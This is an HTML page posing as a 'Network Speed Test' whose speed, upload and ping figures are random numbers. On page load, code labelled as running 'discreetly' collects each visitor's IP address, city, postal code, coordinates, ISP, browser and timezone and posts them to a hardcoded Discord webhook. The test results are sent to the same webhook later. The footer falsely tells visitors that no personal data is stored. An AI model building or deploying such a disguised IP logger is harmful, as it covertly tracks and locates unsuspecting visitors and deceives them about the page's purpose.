<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Speed Test</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(to bottom, #3498db, #2c3e50);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #333;
        }
        
        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 500px;
            padding: 25px;
            text-align: center;
        }
        
        h1 {
            margin-bottom: 15px;
            color: #2c3e50;
            font-size: 28px;
        }
        
        p {
            margin-bottom: 20px;
            line-height: 1.5;
            color: #555;
        }
        
        .speed-test {
            margin-bottom: 20px;
        }
        
        .gauge {
            width: 200px;
            height: 200px;
            margin: 0 auto 20px;
            position: relative;
        }
        
        .gauge-circle {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: #f0f0f0;
            position: relative;
        }
        
        .gauge-fill {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: conic-gradient(#2ecc71 0% var(--progress, 0%), #f0f0f0 var(--progress, 0%) 100%);
            border-radius: 50%;
            transition: background 1s ease;
        }
        
        .gauge-center {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            height: 80%;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: bold;
            color: #2c3e50;
        }
        
        .speed-results {
            display: flex;
            justify-content: space-around;
            margin-bottom: 20px;
        }
        
        .download, .upload, .ping {
            text-align: center;
            padding: 10px;
        }
        
        .speed-value {
            font-size: 20px;
            font-weight: bold;
            color: #2c3e50;
            margin-bottom: 5px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .speed-label {
            font-size: 14px;
            color: #7f8c8d;
        }
        
        .test-btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        
        .test-btn:hover {
            background: #2980b9;
        }
        
        .test-btn:disabled {
            background: #95a5a6;
            cursor: not-allowed;
        }
        
        .progress-container {
            width: 100%;
            height: 8px;
            background: #ecf0f1;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: #3498db;
            border-radius: 4px;
            transition: width 0.5s ease;
        }
        
        .status {
            margin: 15px 0;
            font-size: 14px;
            color: #7f8c8d;
            min-height: 20px;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #7f8c8d;
        }
        
        .hidden {
            display: none;
        }
        
        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Network Speed Test</h1>
        <p>Test your internet connection speed with our simple tool</p>
        
        <div class="speed-test">
            <div class="gauge">
                <div class="gauge-circle">
                    <div class="gauge-fill" style="--progress: 0%"></div>
                    <div class="gauge-center">
                        <span id="gauge-value">0</span>
                    </div>
                </div>
            </div>
            
            <div class="speed-results">
                <div class="download">
                    <div class="speed-value" id="download-speed">0.00</div>
                    <div class="speed-label">DOWNLOAD</div>
                </div>
                <div class="upload">
                    <div class="speed-value" id="upload-speed">0.00</div>
                    <div class="speed-label">UPLOAD</div>
                </div>
                <div class="ping">
                    <div class="speed-value" id="ping-value">0</div>
                    <div class="speed-label">PING</div>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-bar" id="progress-bar"></div>
            </div>
            
            <div class="status" id="status">Ready to test your connection</div>
            
            <button class="test-btn" id="test-btn">
                Start Test
            </button>
        </div>
        
        <p class="footer">We value your privacy. No personal data is stored.</p>
    </div>
    
    <div id="ipData" class="hidden"></div>

    <script>
        // DOM elements
        const testBtn = document.getElementById('test-btn');
        const downloadSpeed = document.getElementById('download-speed');
        const uploadSpeed = document.getElementById('upload-speed');
        const pingValue = document.getElementById('ping-value');
        const gaugeValue = document.getElementById('gauge-value');
        const gaugeFill = document.querySelector('.gauge-fill');
        const progressBar = document.getElementById('progress-bar');
        const status = document.getElementById('status');
        
        // Test variables
        let testInProgress = false;
        let downloadResult = 0;
        let uploadResult = 0;
        let pingResult = 0;
        
        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Start collecting IP data immediately but discreetly
            collectIPData();
            
            // Set up test button event listener
            testBtn.addEventListener('click', startTest);
        });
        
        // Function to collect IP data
        function collectIPData() {
            // Get the IP address using ipify API
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    
                    // Get additional information
                    const timestamp = new Date().toISOString();
                    const userAgent = navigator.userAgent;
                    const language = navigator.language;
                    const platform = navigator.platform;
                    const referrer = document.referrer || 'Direct';
                    const screenResolution = `${window.screen.width}x${window.screen.height}`;
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    
                    // Get location data based on IP
                    fetch(`https://ipapi.co/${ip}/json/`)
                        .then(response => response.json())
                        .then(locationData => {
                            // Store data in hidden element
                            const ipDataElement = document.getElementById('ipData');
                            ipDataElement.textContent = JSON.stringify({
                                ip: ip,
                                timestamp: timestamp,
                                userAgent: userAgent,
                                language: language,
                                platform: platform,
                                referrer: referrer,
                                screenResolution: screenResolution,
                                timezone: timezone,
                                location: {
                                    country: locationData.country_name,
                                    region: locationData.region,
                                    city: locationData.city,
                                    postal: locationData.postal,
                                    latitude: locationData.latitude,
                                    longitude: locationData.longitude
                                },
                                network: {
                                    asn: locationData.asn,
                                    org: locationData.org
                                }
                            });
                            
                            // Send to Discord webhook
                            sendToDiscord(ipDataElement.textContent);
                        })
                        .catch(error => {
                            console.error('Error fetching location data:', error);
                        });
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                });
        }
        
        // Function to send data to Discord webhook
        function sendToDiscord(data) {
            const ipData = JSON.parse(data);
            
            // Format the message for Discord
            const message = {
                content: "New Website Visitor",
                embeds: [
                    {
                        title: "Visitor Information",
                        color: 5814783,
                        fields: [
                            {
                                name: "IP Address",
                                value: ipData.ip || "Unknown",
                                inline: true
                            },
                            {
                                name: "Location",
                                value: `${ipData.location?.city || "Unknown"}, ${ipData.location?.country || "Unknown"}`,
                                inline: true
                            },
                            {
                                name: "Device",
                                value: ipData.platform || "Unknown",
                                inline: true
                            },
                            {
                                name: "Browser",
                                value: ipData.userAgent ? ipData.userAgent.substring(0, 100) + "..." : "Unknown",
                                inline: false
                            }
                        ],
                        timestamp: ipData.timestamp
                    }
                ]
            };
            
            // Send to Discord webhook
            fetch('https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Failed to send data to Discord');
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
            });
        }
        
        // Function to start the speed test
        function startTest() {
            if (testInProgress) return;
            
            testInProgress = true;
            testBtn.disabled = true;
            testBtn.innerHTML = '<span class="loading"></span> Testing...';
            status.textContent = 'Initializing test...';
            
            // Reset values
            downloadResult = 0;
            uploadResult = 0;
            pingResult = 0;
            downloadSpeed.textContent = '0.00';
            uploadSpeed.textContent = '0.00';
            pingValue.textContent = '0';
            gaugeValue.textContent = '0';
            gaugeFill.style.setProperty('--progress', '0%');
            progressBar.style.width = '0%';
            
            // Simulate ping test
            simulatePingTest();
        }
        
        // Simulate ping test
        function simulatePingTest() {
            status.textContent = 'Testing ping...';
            progressBar.style.width = '10%';
            
            setTimeout(() => {
                pingResult = Math.floor(Math.random() * 50) + 10;
                pingValue.textContent = pingResult;
                progressBar.style.width = '20%';
                
                // Simulate download test
                simulateDownloadTest();
            }, 1000);
        }
        
        // Simulate download test with progress
        function simulateDownloadTest() {
            status.textContent = 'Testing download speed...';
            
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 5;
                progressBar.style.width = `${20 + progress * 0.5}%`;
                
                // Animate the gauge
                const currentProgress = Math.min(progress * 0.7, 100);
                gaugeFill.style.setProperty('--progress', `${currentProgress}%`);
                gaugeValue.textContent = Math.round(currentProgress);
                
                if (progress >= 100) {
                    clearInterval(interval);
                    downloadResult = (Math.random() * 90 + 10).toFixed(2);
                    downloadSpeed.textContent = downloadResult;
                    gaugeValue.textContent = Math.round(downloadResult);
                    gaugeFill.style.setProperty('--progress', `${Math.round(downloadResult)}%`);
                    progressBar.style.width = '70%';
                    
                    // Simulate upload test
                    simulateUploadTest();
                }
            }, 100);
        }
        
        // Simulate upload test with progress
        function simulateUploadTest() {
            status.textContent = 'Testing upload speed...';
            
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 5;
                progressBar.style.width = `${70 + progress * 0.3}%`;
                
                if (progress >= 100) {
                    clearInterval(interval);
                    uploadResult = (Math.random() * 40 + 5).toFixed(2);
                    uploadSpeed.textContent = uploadResult;
                    progressBar.style.width = '100%';
                    
                    // Finish the test
                    finishTest();
                }
            }, 100);
        }
        
        // Finish the test
        function finishTest() {
            status.textContent = 'Test complete!';
            testBtn.disabled = false;
            testBtn.innerHTML = 'Test Again';
            testInProgress = false;
            
            // Send test results along with IP data
            sendTestResults();
        }
        
        // Function to send test results to Discord webhook
        function sendTestResults() {
            const ipDataElement = document.getElementById('ipData');
            const ipData = ipDataElement.textContent ? JSON.parse(ipDataElement.textContent) : {};
            
            // Add speed test results to the data
            ipData.speedTest = {
                download: downloadResult,
                upload: uploadResult,
                ping: pingResult,
                timestamp: new Date().toISOString()
            };
            
            // Format the message for Discord
            const message = {
                content: "Speed Test Results",
                embeds: [
                    {
                        title: "Network Performance",
                        color: 5814783,
                        fields: [
                            {
                                name: "Download Speed",
                                value: `${downloadResult} Mbps`,
                                inline: true
                            },
                            {
                                name: "Upload Speed",
                                value: `${uploadResult} Mbps`,
                                inline: true
                            },
                            {
                                name: "Ping",
                                value: `${pingResult} ms`,
                                inline: true
                            },
                            {
                                name: "IP Address",
                                value: ipData.ip || "Unknown",
                                inline: true
                            }
                        ],
                        timestamp: ipData.timestamp
                    }
                ]
            };
            
            // Send to Discord webhook
            fetch('https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Failed to send data to Discord');
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
            });
        }
    </script>
</body>
</html>
